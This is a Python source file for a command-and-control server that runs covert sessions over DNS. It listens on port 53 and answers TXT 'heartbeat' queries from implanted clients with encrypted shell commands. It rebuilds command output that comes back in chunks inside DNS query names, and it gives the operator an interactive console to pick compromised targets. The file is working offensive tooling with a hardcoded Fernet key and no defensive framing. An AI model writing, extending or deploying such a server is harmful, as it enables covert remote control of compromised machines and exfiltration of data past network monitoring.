from dnslib.server import DNSServer, BaseResolver, DNSLogger
from dnslib import RR, QTYPE, TXT, A
import base64, json, time, threading, sys, readline
from cryptography.fernet import Fernet
from colorama import Fore, Style, init

init(autoreset=True)

KEY = b'A2Qti2UZdzbp3AdAwAhK23O1xPo-1dW1agEvNyVX8Lc='
cipher = Fernet(KEY)

clients = {}
buffers = {}
task_queue = {}

current_target = None
lock = threading.Lock()

def g(x): return Fore.GREEN + x + Style.RESET_ALL
def c(x): return Fore.CYAN + x + Style.RESET_ALL
def d(x): return Fore.WHITE + Style.DIM + x + Style.RESET_ALL

def prompt():
    return g(current_target if current_target else "root") + c(" :: ") + "$ "

def print_output(cid, result):
    with lock:
        sys.stdout.write("\n")
        print(g(f"[{cid}]"))
        print(c(result))
        sys.stdout.write(prompt())
        sys.stdout.flush()

class DNSHandler(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname).strip(".")
        qtype = QTYPE[request.q.qtype]
        reply = request.reply()
        parts = qname.split(".")

        if qtype != "TXT":
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=1))
            return reply

        if "heartbeat" in parts:
            cid = parts[0]
            clients[cid] = {"last_seen": time.time()}

            if cid in task_queue and task_queue[cid]:
                task = task_queue[cid].pop(0)
            else:
                task = {"task": "idle"}

            enc = cipher.encrypt(json.dumps(task).encode())
            enc = base64.urlsafe_b64encode(enc).decode()

            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(enc), ttl=1))

        elif "result" in parts:
            try:
                chunk, idx, total, cid = parts[0], int(parts[1]), int(parts[2]), parts[3]

                if cid not in buffers:
                    buffers[cid] = {}

                buffers[cid][idx] = chunk

                if idx == total - 1:
                    data = "".join([buffers[cid].get(i, "") for i in range(total)])
                    decoded = base64.urlsafe_b64decode(data.encode())
                    result = cipher.decrypt(decoded).decode()

                    print_output(cid, result)
                    buffers[cid] = {}

            except:
                pass

            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("ok"), ttl=1))

        else:
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("noop"), ttl=1))

        return reply

COMMANDS = ["exit", "back", ":sessions"]

def completer(text, state):
    options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
    if current_target:
        options += [c for c in clients if c.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

def list_sessions():
    print("\n" + c("[ ACTIVE SESSIONS ]\n"))
    for cid in clients:
        last = int(time.time() - clients[cid]["last_seen"])
        print(g(f"{cid}") + d(f"  ({last}s ago)"))
    print("")


def select_target():
    global current_target
    while True:
        list_sessions()
        t = input(g("select target > ")).strip()
        if t in clients:
            current_target = t
            return

def shell():
    global current_target

    print(c("\nNEURAL LINK ACTIVE\n"))

    while True:
        if not current_target:
            select_target()
            print(g(f"connected -> {current_target}\n"))

        try:
            cmd = input(prompt())

            if cmd == "exit":
                break

            if cmd == "back":
                current_target = None
                continue

            if cmd == ":sessions":
                current_target = None
                continue

            if not cmd.strip():
                continue

            if current_target not in task_queue:
                task_queue[current_target] = []

            task_queue[current_target].append({"task": cmd})

        except KeyboardInterrupt:
            print()
            continue

if __name__ == "__main__":
    resolver = DNSHandler()
    logger = DNSLogger("-request,-reply,-truncated,-error,-data")

    server = DNSServer(resolver, port=53, address="0.0.0.0", logger=logger)
    threading.Thread(target=server.start, daemon=True).start()

    shell()